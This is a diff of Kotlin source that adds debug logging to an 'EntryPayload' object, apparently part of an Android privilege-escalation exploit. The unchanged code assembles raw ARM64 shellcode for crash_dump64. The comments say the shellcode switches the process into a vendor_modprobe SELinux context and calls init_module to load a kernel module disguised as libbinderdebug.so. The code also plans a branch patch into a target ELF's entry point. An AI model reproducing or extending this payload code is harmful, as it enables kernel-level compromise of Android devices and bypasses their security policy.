@@ -1,5 +1,8 @@
 package com.ghostlock.app.engine.pagecache
 
+import com.ghostlock.app.engine.pagecache.stage.StageLog
+import com.ghostlock.app.engine.pagecache.stage.silentStageLog
+
 /**
  * crash_dump64 静态入口 payload：
  *   1. 写 /proc/self/attr/exec = u:r:vendor_modprobe:s0
@@ -20,7 +23,8 @@ object EntryPayload {
     private const val KO = "/vendor/lib64/libbinderdebug.so"
 
     /** 诊断：crash_dump 域直接 init_module(carrier)，不 exec insmod。 */
-    fun initModuleBytes(): ByteArray {
+    fun initModuleBytes(log: StageLog = silentStageLog): ByteArray {
+        log.verbose("EntryPayload.initModuleBytes")
         val words = ArrayList<Int>(40)
         fun emit(word: Int) { words.add(word) }
         fun adr(rd: Int, fromOffset: Int, toOffset: Int): Int {
@@ -67,18 +71,25 @@ object EntryPayload {
         KO.toByteArray().copyInto(raw, at); at += KO.length
         raw[at++] = 0
         raw[at] = 0
+        log.debug("EntryPayload.initModuleBytes", "ok", "bytes" to raw.size)
         return raw
     }
 
     /** 诊断用：只 exit(42)。 */
-    fun exitOnly(): ByteArray = byteArrayOf(
+    fun exitOnly(log: StageLog = silentStageLog): ByteArray {
+        log.verbose("EntryPayload.exitOnly")
+        val raw = byteArrayOf(
         0x40, 0x05, 0x80.toByte(), 0xD2.toByte(),
         0xA8.toByte(), 0x0B, 0x80.toByte(), 0xD2.toByte(),
         0x01, 0x00, 0x00, 0xD4.toByte(),
         0x00, 0x00, 0x00, 0x00,
-    )
+        )
+        log.debug("EntryPayload.exitOnly", "ok", "bytes" to raw.size)
+        return raw
+    }
 
-    fun bytes(): ByteArray {
+    fun bytes(log: StageLog = silentStageLog): ByteArray {
+        log.verbose("EntryPayload.bytes")
         val words = ArrayList<Int>(32)
         fun emit(word: Int) { words.add(word) }
         fun adr(rd: Int, fromOffset: Int, toOffset: Int): Int {
@@ -136,13 +147,16 @@ object EntryPayload {
         raw[at++] = 0
         KO.toByteArray().copyInto(raw, at); at += KO.length
         raw[at] = 0
+        log.debug("EntryPayload.bytes", "ok", "bytes" to raw.size)
         return raw
     }
 
     /** 从目标 ELF 派生入口 plan；branch 目标就是 landing 本身（不是 sentry 的 +0x90）。 */
-    fun plan(target: ElfTarget): KotlinSentryPlan? {
-        val derived = KotlinElfPlanner.planEntry(target, bytes()) ?: return null
-        val branch = KotlinElfPlanner.encodeBranch(derived.siteVaddr, derived.landingVaddr) ?: return null
+    fun plan(target: ElfTarget, log: StageLog = silentStageLog): KotlinSentryPlan? {
+        log.verbose("EntryPayload.plan", "target" to target.path)
+        val derived = KotlinElfPlanner.planEntry(target, bytes(log), log) ?: return null
+        val branch = KotlinElfPlanner.encodeBranch(derived.siteVaddr, derived.landingVaddr, log) ?: return null
+        log.debug("EntryPayload.plan", "ok", "site" to derived.siteVaddr)
         return derived.copy(
             branchWord = branch,
             jumpBackWord = 0,
